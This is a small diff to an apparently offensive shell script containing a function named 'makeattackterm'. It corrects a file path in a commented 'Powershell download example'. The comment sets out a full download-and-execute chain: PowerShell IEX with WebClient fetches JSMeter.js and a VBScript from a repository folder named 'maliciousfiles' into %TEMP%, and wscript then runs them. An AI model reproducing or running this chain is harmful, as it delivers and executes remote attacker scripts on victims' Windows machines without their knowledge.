@@ -112,7 +112,7 @@ makeattackterm() {
 #
 ### Powershell download example:
 #
-#   powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/subinacls/JSMeter/master/JSMeter.js') -OutFile %TEMP%ev.js &&
+#   powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/subinacls/JSMeter/master/JSMeter.js') -OutFile %TEMP%\ev.js &&
 #   powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/subinacls/Bash-Full/master/maliciousfiles/invisi.vbs') -OutFile %TEMP%\inv.vbs &&
 #   wscript %TEMP%\inv.vbs %TEMP%\ev.js
 #
